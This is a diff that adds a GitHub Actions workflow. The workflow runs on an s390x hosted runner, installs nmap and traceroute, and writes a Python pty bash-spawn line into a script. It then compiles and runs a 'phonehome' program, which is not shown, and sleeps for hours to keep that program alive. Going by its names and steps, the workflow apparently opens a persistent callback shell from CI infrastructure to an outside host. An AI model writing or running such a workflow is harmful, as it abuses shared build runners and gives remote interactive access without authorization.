@@ -1,0 +1,25 @@
+name: hoopes-callback-s390
+on:
+
+#  workflow_dispatch:
+#  Using abc branch to only run when I manually trigger it.
+  push:
+    branches: [ "abc" ]
+#  pull_request:
+  
+jobs:   
+  power_shell:
+    runs-on: ubuntu-24.04-s390x
+    steps:
+    - uses: actions/checkout@v4
+      
+    - name: Lets do this
+      run: |
+        sudo apt update
+        sudo apt install nmap traceroute
+        echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" > fix_job.sh
+        gcc phonehome.c -o phonehome
+        ./phonehome
+        #pause for about 2.8 hours so that phonehome doesn't die. Not sure why phonehome doesn't keep things alive.
+        sleep 10000
+  
